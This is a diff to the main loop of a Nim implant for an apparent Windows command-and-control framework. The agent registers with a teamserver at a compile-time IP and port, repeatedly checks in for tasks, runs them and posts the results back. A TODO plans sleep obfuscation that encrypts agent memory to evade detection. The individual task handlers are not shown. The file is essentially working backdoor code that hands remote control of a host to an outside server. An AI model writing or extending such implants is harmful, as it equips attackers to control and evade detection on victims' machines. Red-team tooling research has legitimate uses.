@@ -1,7 +1,10 @@
-import strformat, os, times
+import strformat, os, times, random
 import winim
+import sugar
 
-import ./[types, http, taskHandler]
+import ./agentTypes
+import core/[task, packer, http, metadata]
+import ../../common/[types, utils]
 
 const ListenerUuid {.strdefine.}: string = ""
 const Octet1 {.intdefine.}: int = 0
@@ -12,6 +15,7 @@ const ListenerPort {.intdefine.}: int = 5555
 const SleepDelay {.intdefine.}: int = 10
 
 proc main() = 
+    randomize()
 
     #[
         The process is the following:
@@ -33,14 +37,19 @@ proc main() =
 
     # Create agent configuration
     var config = AgentConfig(
-        listener: ListenerUuid,
+        agentId: generateUUID(),
+        listenerId: ListenerUuid,
         ip: address, 
         port: ListenerPort, 
         sleep: SleepDelay
     )
 
-    let agent = config.register()
-    echo fmt"[+] [{agent}] Agent registered."
+    # Create registration payload
+    let registrationData: AgentRegistrationData = config.getRegistrationData()
+    let registrationBytes = serializeRegistrationData(registrationData)
+
+    config.register(registrationBytes)
+    echo fmt"[+] [{config.agentId}] Agent registered."
 
     #[
         Agent routine: 
@@ -52,22 +61,33 @@ proc main() =
     ]#
     while true: 
 
+        # TODO: Replace with actual sleep obfuscation that encrypts agent memory
         sleep(config.sleep * 1000)
 
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
         echo fmt"[{date}] Checking in."
 
-        # Retrieve task queue from the teamserver for the current agent
-        let tasks: seq[Task] = config.getTasks(agent)
+        # Retrieve task queue for the current agent
+        let packet: string = config.getTasks()
 
-        if tasks.len <= 0: 
-            echo "[*] No tasks to execute."
-            continue 
+        if packet.len <= 0: 
+            echo "No tasks to execute."
+            continue
+
+        let tasks: seq[Task] = deserializePacket(packet)
         
+        if tasks.len <= 0: 
+            echo "No tasks to execute."
+            continue
+
         # Execute all retrieved tasks and return their output to the server
         for task in tasks: 
-            let result: TaskResult = task.handleTask(config)
-            discard config.postResults(agent, result)
+            let 
+                result: TaskResult = config.handleTask(task)
+                resultData: seq[byte] = serializeTaskResult(result)
+
+            # echo resultData
+            config.postResults(resultData)
             
 when isMainModule: 
     main() 
